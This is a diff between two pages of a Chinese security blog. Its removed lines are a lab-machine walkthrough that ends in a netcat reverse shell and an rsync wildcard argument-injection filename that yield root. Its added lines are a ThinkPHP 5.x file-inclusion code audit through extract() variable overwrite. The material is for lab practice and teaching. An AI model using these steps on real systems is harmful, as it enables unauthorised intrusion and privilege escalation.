@@ -14,15 +14,15 @@
   <meta name="theme-color">
 
   
-  <title>Maze-GuoQing靶机！ &middot; IIIIIII的博客</title>
-    <meta name="title" content="Maze-GuoQing靶机！ &middot; IIIIIII的博客">
+  <title>MVC-PHP代码审计6-框架-文件包含 &middot; IIIIIII的博客</title>
+    <meta name="title" content="MVC-PHP代码审计6-框架-文件包含 &middot; IIIIIII的博客">
 
   
   
-  <meta name="keywords" content="strings,">
+  <meta name="keywords" content="php,">
   
   
-  <link rel="canonical" href="https://Starrui777.github.io/posts/guoqing/">
+  <link rel="canonical" href="https://Starrui777.github.io/posts/code8phpmvc/">
   
   
   
@@ -95,45 +95,45 @@
   
 
   
-  <meta property="og:url" content="https://Starrui777.github.io/posts/guoqing/">
+  <meta property="og:url" content="https://Starrui777.github.io/posts/code8phpmvc/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="Maze-GuoQing靶机！">
+  <meta property="og:title" content="MVC-PHP代码审计6-框架-文件包含">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-07T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-10-07T00:00:00+00:00">
-    <meta property="article:tag" content="Strings">
+    <meta property="article:published_time" content="2025-10-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-09T00:00:00+00:00">
+    <meta property="article:tag" content="Php">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Maze-GuoQing靶机！">
+  <meta name="twitter:title" content="MVC-PHP代码审计6-框架-文件包含">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Maze-GuoQing靶机！",
-    "headline": "Maze-GuoQing靶机！",
+    "name": "MVC-PHP代码审计6-框架-文件包含",
+    "headline": "MVC-PHP代码审计6-框架-文件包含",
     
     
     "inLanguage": "en",
-    "url" : "https:\/\/Starrui777.github.io\/posts\/guoqing\/",
+    "url" : "https:\/\/Starrui777.github.io\/posts\/code8phpmvc\/",
     "author" : {
       "@type": "Person",
       "name": "IIIIIIIIIIII"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-10-07T00:00:00\u002b00:00",
-    "datePublished": "2025-10-07T00:00:00\u002b00:00",
+    "dateCreated": "2025-10-09T00:00:00\u002b00:00",
+    "datePublished": "2025-10-09T00:00:00\u002b00:00",
     
-    "dateModified": "2025-10-07T00:00:00\u002b00:00",
+    "dateModified": "2025-10-09T00:00:00\u002b00:00",
     
-    "keywords": ["strings"],
+    "keywords": ["php"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "129"
+    "wordCount": "151"
   }]
   </script>
 
@@ -509,7 +509,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Maze-GuoQing靶机！
+        MVC-PHP代码审计6-框架-文件包含
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-10-07T00:00:00&#43;00:00">7 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>129 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2025-10-09T00:00:00&#43;00:00">9 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>151 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
     
 
     
@@ -586,11 +586,11 @@
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/strings/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Strings
+    Php
   </span>
 </span>
 </a
@@ -740,7 +740,16 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#maze-guoqing靶机-作者群主-qq群660930334">Maze-GuoQing靶机-作者：群主-QQ群660930334</a></li>
+    <li><a href="#mvc-php代码审计6-框架-文件包含">MVC-PHP代码审计6-框架-文件包含</a>
+      <ul>
+        <li><a href="#案例一thinkphp-文件包含cachefiledemophp">案例一：ThinkPHP-文件包含cacheFile=demo.php</a>
+          <ul>
+            <li><a href="#分析">分析</a></li>
+            <li><a href="#启动动态调试来测试流程">启动动态调试来测试流程</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -754,7 +763,16 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#maze-guoqing靶机-作者群主-qq群660930334">Maze-GuoQing靶机-作者：群主-QQ群660930334</a></li>
+    <li><a href="#mvc-php代码审计6-框架-文件包含">MVC-PHP代码审计6-框架-文件包含</a>
+      <ul>
+        <li><a href="#案例一thinkphp-文件包含cachefiledemophp">案例一：ThinkPHP-文件包含cacheFile=demo.php</a>
+          <ul>
+            <li><a href="#分析">分析</a></li>
+            <li><a href="#启动动态调试来测试流程">启动动态调试来测试流程</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -774,56 +792,170 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">Maze-GuoQing靶机-作者：群主-QQ群660930334 
-    <div id="maze-guoqing靶机-作者群主-qq群660930334" class="anchor"></div>
+<h2 class="relative group">MVC-PHP代码审计6-框架-文件包含 
+    <div id="mvc-php代码审计6-框架-文件包含" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#maze-guoqing%e9%9d%b6%e6%9c%ba-%e4%bd%9c%e8%80%85%e7%be%a4%e4%b8%bb-qq%e7%be%a4660930334" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#mvc-php%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a16-%e6%a1%86%e6%9e%b6-%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <!-- more --> 
-<pre tabindex="0"><code>└─# nmap 192.168.1.238       
-Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-07 01:22 EDT
-Nmap scan report for 192.168.1.238
-Host is up (0.00074s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:FE:EB:F8 (Oracle VirtualBox virtual NIC)
-</code></pre><p>访问80没什么东西有一个登录界面通过爆破发现爆破不出来</p>
-<p>下载中间这个选择的卷福图片使用strings发现后面有字符密码</p>
-<pre tabindex="0"><code>─# strings todd.png   
-
-todd:toddishandsome
-</code></pre><p>发现密码 hyh hyhforever登录后</p>
-<p>有一个password程序反编译获得密钥</p>
-<p>vhjidxowqr1</p>
-<p>凯撒解密偏移量3</p>
-<p>解得密码segfaultno1</p>
-<p>登录后查看进程pspy64</p>
-<pre tabindex="0"><code>/bin/sh -c cd /home/segfault &amp;&amp; rsync -t *.txt Guoqing:/tmp/backup/
-</code></pre><p>创建恶意脚本执行</p>
-<pre tabindex="0"><code>segfault@Guoqing:~$ vi 1.txt
-segfault@Guoqing:~$ cat 1.txt 
-#!/bin/bash
-busybox nc 192.168.1.199 6666 -e /bin/bash
-segfault@Guoqing:~$ 
-segfault@Guoqing:~$ chmod +x 1.txt 
-segfault@Guoqing:~$ echo &#34;&#34; &gt; &#39;-e sh 1.txt&#39;
-segfault@Guoqing:~$ ls -al
-然后监听
-└─# nc -lvvp 6666               
-listening on [any] 6666 ...
-192.168.1.238: inverse host lookup failed: Unknown host
-connect to [192.168.1.199] from (UNKNOWN) [192.168.1.238] 60544
-whoami
-root
-cat /root/root.txt
-flag{root-834xxx}
+<pre tabindex="0"><code>判断是否是框架：
+	搜索version  THINK_VERSION
+	判断语法
+	看文件名
 </code></pre>
+<h3 class="relative group">案例一：ThinkPHP-文件包含cacheFile=demo.php 
+    <div id="案例一thinkphp-文件包含cachefiledemophp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%b8%80thinkphp-%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%abcachefiledemophp" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong>。</p>
+<p>include require_once require 三个函数导致文件包含</p>
+<p>先看效果在index下面直接包含就可以执行php脚本命令</p>
+<p>直接触发了</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/mvc6/1.png">
+
+  
+</figure>
+</p>
+
+<h4 class="relative group">分析 
+    <div id="分析" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%86%e6%9e%90" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>index下面用了这两行tp自带代码</p>
+<ol>
+<li>
+<p><strong><code>request()-&gt;get()</code></strong> - 获取所有GET参数</p>
+</li>
+<li>
+<p><strong><code>$this-&gt;assign()</code></strong> - 将GET参数全部作为模板变量赋值</p>
+<p>所以catchfile才能传入</p>
+</li>
+</ol>
+<pre tabindex="0"><code>&lt;?php
+namespace app\index\controller;
+use think\Controller;
+class Index extends Controller
+{
+    public function index()
+    {
+        $this-&gt;assign(request()-&gt;get());
+        return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
+    }
+    
+</code></pre><p>跟踪assign</p>
+<p>到了controller.php  ，这个view是模板实例不是变量</p>
+<pre tabindex="0"><code> @var \think\View 
+ protected $view;
+ $this-&gt;view = View::instance(Config::get(&#39;template&#39;), Config::get(&#39;view_replace_str&#39;));
+
+protected function assign($name, $value = &#39;&#39;)
+{
+    $this-&gt;view-&gt;assign($name, $value);
+
+    return $this;
+}
+</code></pre><p>跟踪assign到了view.php</p>
+<pre tabindex="0"><code>public function assign($name, $value = &#39;&#39;)
+{
+    if (is_array($name)) {
+        $this-&gt;data = array_merge($this-&gt;data, $name);
+    } else {
+        $this-&gt;data[$name] = $value;
+    }
+    return $this;
+}
+</code></pre><p>也没什么东西啊</p>
+<p>thinkphp/library/think/template/driver/File.php</p>
+<p>找到了关键的代码这里要理解extract的函数作用</p>
+<p>extract:用于通过函数来手动给变量赋值导致变量覆盖</p>
+<pre tabindex="0"><code>public function read($cacheFile, $vars = [])
+{
+    if (!empty($vars) &amp;&amp; is_array($vars)) {
+        // 模板阵列变量分解成为独立变量
+        extract($vars, EXTR_OVERWRITE);
+    }
+    //载入模版缓存文件
+    include $cacheFile;
+}
+</code></pre><p>正常来说 include应该是缓存文件的路径 比如你访问index下面就是include index页面缓存文件  但是通过变量覆盖修改路径为我们的恶意php文件</p>
+<p>?cacheFile=1.txt $cacheFile=1.txt 直接·赋值</p>
+
+<h4 class="relative group">启动动态调试来测试流程 
+    <div id="启动动态调试来测试流程" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%90%af%e5%8a%a8%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%9d%a5%e6%b5%8b%e8%af%95%e6%b5%81%e7%a8%8b" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>phpstudy在php设置那里开启x-debug</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/mvc6/2.png">
+
+  
+</figure>
+</p>
+<p>打开对应php.ini</p>
+<pre tabindex="0"><code>zend_extension=E:/phpstudy_pro/Extensions/php/php7.4.3nts/ext/php_xdebug.dll
+xdebug.collect_params=1
+xdebug.collect_return=1
+xdebug.auto_trace=Off
+xdebug.trace_output_dir=E:/phpstudy_pro/Extensions/php_log/php7.4.3nts.xdebug.trace
+xdebug.profiler_enable=Off
+xdebug.profiler_output_dir=E:/phpstudy_pro/Extensions/php_log/php7.4.3nts.xdebug.profiler
+xdebug.remote_enable=On
+xdebug.remote_host=localhost
+xdebug.remote_port=9000
+xdebug.idekey=PHPSTORM
+xdebug.remote_handler=dbgp
+没有的自己添加上去特别是phpstorm那个idekey
+</code></pre><p>配置phpstorm</p>
+<p>端口是网站端口</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/mvc6/3.png">
+
+  
+</figure>
+</p>
+<p>可以看看官方github对比版本修复情况 是否是内部测试人员没有公开 就可以拿到漏洞</p>
+
           
           
           
@@ -939,129 +1071,6 @@ flag{root-834xxx}
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Php
-  </span>
-</span>
-</a
-              >
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-    </div>
-    
-  </div>
-  <div class="px-6 pt-4 pb-2"></div>
-</div>
-
-      
-        
-<div
-  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
-  <a
-    
-  href="/posts/ame/"
-    class="absolute inset-0"
-    aria-label="Logi靶机-maze-JWT-Ti15中国队加油！"></a>
-      
-    
-        
-          <div
-            class="thumbnail_card_related nozoom w-full"
-            style="background-image:url(/image/background.svg);"></div>
-        
-      
-  <div class="px-6 py-4">
-    
-      <div
-        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        Logi靶机-maze-JWT-Ti15中国队加油！
-      </div>
-    
-    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-10-01T00:00:00&#43;00:00">1 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>265 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/jwt/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Jwt
   </span>
 </span>
 </a
@@ -1213,139 +1222,6 @@ flag{root-834xxx}
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/readfile/"
-    class="absolute inset-0"
-    aria-label="readfile靶机-maze-snmp-rbash-能力机制"></a>
-      
-    
-        
-          <div
-            class="thumbnail_card_related nozoom w-full"
-            style="background-image:url(/image/background.svg);"></div>
-        
-      
-  <div class="px-6 py-4">
-    
-      <div
-        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        readfile靶机-maze-snmp-rbash-能力机制
-      </div>
-    
-    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-09-28T00:00:00&#43;00:00">28 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>723 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/rbash/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Rbash
-  </span>
-</span>
-</a
-              >
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/smtp/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Smtp
-  </span>
-</span>
-</a
-              >
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-    </div>
-    
-  </div>
-  <div class="px-6 pt-4 pb-2"></div>
-</div>
-
-      
-        
-<div
-  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
-  <a
-    
   href="/posts/code4phpmvc/"
     class="absolute inset-0"
     aria-label="MVC-PHP代码审计2"></a>
@@ -1464,6 +1340,252 @@ flag{root-834xxx}
 </div>
 
       
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/posts/code5phpmvc/"
+    class="absolute inset-0"
+    aria-label="MVC-PHP代码审计3-反序列化-原生-框架"></a>
+      
+    
+        
+          <div
+            class="thumbnail_card_related nozoom w-full"
+            style="background-image:url(/image/background.svg);"></div>
+        
+      
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        MVC-PHP代码审计3-反序列化-原生-框架
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-09-27T00:00:00&#43;00:00">27 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>452 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Php
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
+      
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/posts/code3phpmvc/"
+    class="absolute inset-0"
+    aria-label="MVC-PHP代码审计"></a>
+      
+    
+        
+          <div
+            class="thumbnail_card_related nozoom w-full"
+            style="background-image:url(/image/background.svg);"></div>
+        
+      
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        MVC-PHP代码审计
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-09-26T00:00:00&#43;00:00">26 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>336 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Php
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
+      
     </section>
   
 
@@ -1483,8 +1605,8 @@ flag{root-834xxx}
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts\guoqing.md"
-          data-oid-likes="likes_posts\guoqing.md"></script>
+          data-oid="views_posts\code8phpmvc.md"
+          data-oid-likes="likes_posts\code8phpmvc.md"></script>
       
     </section>
 
@@ -1500,7 +1622,7 @@ flag{root-834xxx}
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/code7phpmvc/">
+            <a class="flex group mr-3" href="/posts/guoqing/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1511,11 +1633,11 @@ flag{root-834xxx}
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >MVC-PHP代码审计5-框架-反序列化构建链</span
+                  >Maze-GuoQing靶机！</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-10-06T00:00:00&#43;00:00">6 October 2025</time>
+                    <time datetime="2025-10-07T00:00:00&#43;00:00">7 October 2025</time>
                   
                 </span>
               </span>
@@ -1524,14 +1646,14 @@ flag{root-834xxx}
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/posts/code8phpmvc/">
+            <a class="flex text-right group ml-3" href="/posts/code9phpmvc/">
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >MVC-PHP代码审计6-框架-文件包含</span
+                  >PHP代码审计7-变量覆盖</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-10-09T00:00:00&#43;00:00">9 October 2025</time>
+                    <time datetime="2025-10-10T00:00:00&#43;00:00">10 October 2025</time>
                   
                 </span>
               </span>
